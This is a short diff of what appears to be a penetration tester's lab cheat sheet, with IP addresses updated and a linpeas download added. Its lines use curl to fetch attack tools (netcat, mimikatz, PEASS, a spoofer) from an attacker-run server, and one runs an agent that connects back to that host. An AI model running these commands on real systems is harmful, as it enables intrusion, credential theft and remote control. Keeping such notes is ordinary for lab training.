@@ -2,13 +2,16 @@ curl.exe http://192.168.45.206:8000/spoofer.exe -o spoofer.exe
 
 curl.exe http://192.168.45.156:8000/nc.exe -o nc.exe
 
-curl.exe http://192.168.45.156:8000/agent.exe -o agent.exe
+curl.exe http://192.168.45.224:8000/agent.exe -o agent.exe
 
-.\agent.exe -connect 192.168.45.156:443 -ignore-cert
+.\agent.exe -connect 192.168.45.224:443 -ignore-cert
 
 curl.exe http://192.168.45.156:8000/mimikatz.exe -o mimikatz.exe
 
 curl.exe http://192.168.45.156:8000/peass64.exe -o peass.exe
+
+curl http://192.168.45.152:8000/linpeas.sh -o linpeas.sh
+
 
 curl.exe http://192.168.45.156:8000/sysinternal/Procmon64.exe -o procmon.exe
 
